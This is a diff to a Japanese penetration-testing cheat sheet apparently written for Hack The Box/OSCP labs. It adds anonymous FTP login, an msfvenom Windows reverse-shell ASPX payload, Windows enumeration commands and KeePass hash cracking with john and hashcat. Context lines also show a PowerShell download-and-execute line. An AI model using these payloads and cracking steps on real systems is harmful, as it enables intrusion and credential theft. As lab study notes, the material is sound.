@@ -29,8 +29,10 @@ socialImage: "/media/cards/no-image.png"
   - [攻略開始時(ポートスキャン)](#攻略開始時ポートスキャン)
   - [ネットワーク探索のポイント](#ネットワーク探索のポイント)
   - [Webスキャン](#webスキャン)
+  - [FTP接続](#ftp接続)
   - [攻撃ファイル転送](#攻撃ファイル転送)
   - [リバースシェル](#リバースシェル)
+  - [ペイロードの生成](#ペイロードの生成)
 - [スキャンツールまとめ](#スキャンツールまとめ)
   - [ポートスキャン](#ポートスキャン)
   - [データベースのスキャン](#データベースのスキャン)
@@ -46,11 +48,11 @@ socialImage: "/media/cards/no-image.png"
   - [SMB、Active Directoryを悪用したリモートアクセス](#smbactive-directoryを悪用したリモートアクセス)
 - [内部探索(Windows)](#内部探索windows)
   - [内部探索のポイント](#内部探索のポイント)
+  - [端末情報の取得](#端末情報の取得)
   - [Windowsエクスプロイトの特定](#windowsエクスプロイトの特定)
   - [Windowsユーザ情報、セキュリティ特権の探索](#windowsユーザ情報セキュリティ特権の探索)
   - [UACの変更](#uacの変更)
   - [フォルダ、共有フォルダの権限の探索](#フォルダ共有フォルダの権限の探索)
-  - [タスクスケジューラ設定の確認](#タスクスケジューラ設定の確認)
   - [環境変数の確認](#環境変数の確認)
 - [特権取得(Windows)](#特権取得windows)
   - [mimikatzでKerberos環境を攻撃する](#mimikatzでkerberos環境を攻撃する)
@@ -126,6 +128,15 @@ feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium
 
 # WevDAVの探索
 /usr/bin/davtest -url http://targethost.htb/
+```
+
+### FTP接続
+
+``` bash
+# Anonymous Login
+$ ftp targethost.htb
+Connected to targethost.htb.
+Name (targethost.htb:kali): anonymous
 ```
 
 ### 攻撃ファイル転送
@@ -209,6 +220,24 @@ powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1:5000
 参考：[Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
 参考：[Reverse Shell Cheat Sheet - OSCP](https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet)
+
+参考：[Offensive Security Cheatsheet](https://cheatsheet.haax.fr/windows-systems/exploitation/iis/)
+
+参考：[kash1064/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/kash1064/PayloadsAllTheThings?organization=kash1064&organization=kash1064)
+
+### ペイロードの生成
+
+- msfvenomはOSCPでも使用可能
+
+``` bash
+$ LHOST=`ip addr | grep -E -o "10.10.([0-9]{1,3}[\.]){1}[0-9]{1,3}"`
+
+# IIS
+# ASP(.asp)はインタプリタ方式、ASP.NET(.aspx)はコンパイラ方式
+$ msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -o rev.aspx
+```
+
+参考：[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter) | Infinite Logins](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
 
 ## スキャンツールまとめ
 
@@ -503,6 +532,26 @@ evil-winrm -i targethost.htb　-u Administrator -H 'NTLM hash'
 
 参考：[PowerShellのセッション](/hackthebox-windows-optimum#powershell%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3)
 
+### 端末情報の取得
+
+``` bash
+# winPEASは試しておく
+
+# 端末の構成情報
+systeminfo
+
+# スケジュールタスク
+schtasks /Query /FO LIST 
+
+# サービスの確認
+sc query state = all
+
+# フォルダ探索
+dir "C:\Program Files"
+dir "C:\Program Files (x86)"
+dir "C:\Users"
+```
+
 ### Windowsエクスプロイトの特定
 
 ``` bash
@@ -549,10 +598,6 @@ icacls でアクセス許可を確認
 #AD-データを追加します（サブディレクトリを追加します）
 #WD-データの書き込みとファイルの追可
 ```
-
-### タスクスケジューラ設定の確認
-
-
 
 ### 環境変数の確認
 
@@ -722,7 +767,11 @@ hashcat -m 17210 -a 3 ./hash.txt -1 ?l?u -2 012 -3 0123 -4 0123456789 ?1?1?1?s20
 
 ``` bash
 $ keepass2john MyPasswords.kdbx > dbhash.txt # DBNAME:$keepass$....
-$ sed -i 's/^.*://g' dbhash.txt # DBNAMEの削除
+
+# keepass2johnでKeyファイルを使用
+$ keepass2john MyPasswords.kdbx > dbhash.txt && ls | grep keyfile | while read f; do keepass2john -k $f MyPasswords.kdbx >> dbhash.txt ; done
+
+$ john dbhash.txt /usr/share/wordlists/rockyou.txt
 $ hashcat -a 0 -m 13400 -w 4 dbhash.txt /usr/share/wordlists/rockyou.txt
 ```
 
